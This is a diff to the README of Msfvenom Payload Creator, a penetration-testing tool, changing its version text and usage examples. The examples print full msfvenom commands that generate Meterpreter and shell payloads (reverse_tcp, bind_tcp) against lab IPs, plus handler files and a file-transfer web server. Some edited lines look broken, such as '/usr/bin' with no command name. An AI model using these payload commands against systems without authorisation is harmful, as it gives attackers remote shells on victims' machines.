@@ -34,15 +34,15 @@ mpc
 
 ```
 root@kali:~# mpc -h -v
- [*] Msfvenom Payload Creator (MPC v1.3)
+ [*] Msfvenom Payload Creator (MPC v1.3.2)
 
- [i] /usr/bin/mpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
- [i]   Example: /usr/bin/mpc windows 192.168.1.10        # Windows & manual IP.
- [i]            /usr/bin/mpc elf eth0 4444               # Linux, eth0's IP & manual port.
- [i]            /usr/bin/mpc stageless cmd py verbose    # Python, stageless command prompt.
- [i]            /usr/bin/mpc loop eth1                   # A payload for every type, using eth1's IP.
- [i]            /usr/bin/mpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
- [i]            /usr/bin/mpc help verbose                # This help screen, with even more information.
+ [i] /usr/bin <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
+ [i]   Example: /usr/bin windows 192.168.1.10        # Windows & manual IP.
+ [i]            /usr/bin elf eth0 4444               # Linux, eth0's IP & manual port.
+ [i]            /usr/bin stageless cmd py verbose    # Python, stageless command prompt.
+ [i]            /usr/bin loop eth1                   # A payload for every type, using eth1's IP.
+ [i]            /usr/bin msf batch wan               # All possible Meterpreter payloads, using WAN IP.
+ [i]            /usr/bin help verbose                # This help screen, with even more information.
 
  [i] <TYPE>:
  [i]   + ASP
@@ -104,7 +104,7 @@ root@kali:~#
 
 ```bash
 root@kali:~# mpc windows 192.168.1.10
- [*] Msfvenom Payload Creator (MPC v1.3)
+ [*] Msfvenom Payload Creator (MPC v1.3.2)
  [i]   IP: 192.168.1.10
  [i] PORT: 443
  [i] TYPE: windows (windows/meterpreter/reverse_tcp)
@@ -120,14 +120,22 @@ root@kali:~#
 ## Example \#2 (Linux Format, Fully Automated With Interface and Port)
 
 ```bash
-root@kali:~# ./mpc elf eth0 4444
- [*] Msfvenom Payload Creator (MPC v1.3)
- [i]   IP: 192.168.103.238
- [i] PORT: 4444
- [i] TYPE: linux (linux/x86/shell/reverse_tcp)
- [i]  CMD: msfvenom -p linux/x86/shell/reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.103.238 LPORT=4444 > /root/linux-shell-staged-reverse-tcp-4444.elf
- [i] linux shell created: '/root/linux-shell-staged-reverse-tcp-4444.elf'
- [i] MSF handler file: '/root/linux-shell-staged-reverse-tcp-4444-elf.rc'   (msfconsole -q -r /root/linux-shell-staged-reverse-tcp-4444-elf.rc)
+root@kali:~# . elf bind eth0 4444 verbose
+ [*] Msfvenom Payload Creator (MPC v1.3.2)
+ [i]        IP: 192.168.103.140
+ [i]      PORT: 4444
+ [i]      TYPE: linux (linux/x86/shell/bind_tcp)
+ [i]     SHELL: shell
+ [i] DIRECTION: bind
+ [i]     STAGE: staged
+ [i]    METHOD: tcp
+ [i]       CMD: msfvenom -p linux/x86/shell/bind_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.103.140 LPORT=4444 > '/root/linux-shell-staged-bind-tcp-4444.elf'
+ [i] linux shell created: '/root/linux-shell-staged-bind-tcp-4444.elf'
+ [i] File: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size
+ [i] Size: 4.0K
+ [i]  MD5: 06092c38c3dcb30fcb455e1ee16fb782
+ [i] SHA1: 19c3ec0e4987c7dd6d77550cacfef617f5d880ed
+ [i] MSF handler file: '/root/linux-shell-staged-bind-tcp-4444-elf.rc'   (msfconsole -q -r /root/linux-shell-staged-bind-tcp-4444-elf.rc)
  [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
  [*] Done!
 root@kali:~#
@@ -136,8 +144,8 @@ root@kali:~#
 ## Example \#3 (Python Format, Stageless Command Prompt Using Interactive IP Menu)
 
 ```bash
-root@kali:~# mpc stageless cmd py verbose
- [*] Msfvenom Payload Creator (MPC v1.3)
+root@kali:~# bash mpc.sh stageless cmd py https
+ [*] Msfvenom Payload Creator (MPC v1.3.2)
 
  [i] Use which interface/IP address?:
  [i]   1.) eth0 - 192.168.103.238
@@ -166,6 +174,32 @@ root@kali:~# mpc stageless cmd py verbose
 root@kali:~#
 ```
 _Note: Removed WAN IP._
+
+
+## Example \#4 (Loop)
+
+```bash
+root@kali:~# bash mpc.sh loop eth1
+ [*] Msfvenom Payload Creator (MPC v1.3.2)
+ [i] Loop Mode. Creating one of each TYPE, with default values
+
+ [*] Msfvenom Payload Creator (MPC v1.3.2)
+ [i]   IP: 192.168.155.175
+ [i] PORT: 443
+ [i] TYPE: windows (windows/meterpreter/reverse_tcp)
+ [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f asp --platform windows -a x86 -e generic/none LHOST=192.168.155.175 LPORT=443 > '/root/windows-meterpreter-staged-reverse-tcp-443.asp'
+ [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.asp'
+ [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-asp.rc'   (msfconsole -q -r /root/windows-meterpreter-staged-reverse-tcp-443-asp.rc)
+ [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
+ [*] Done!
+
+
+ [*] Msfvenom Payload Creator (MPC v1.3.2)
+...SNIP...
+ [*] Done!
+
+root@kali ~$
+```
 
 ![Examples](https://i.imgur.com/r9Qmzda.png)
 
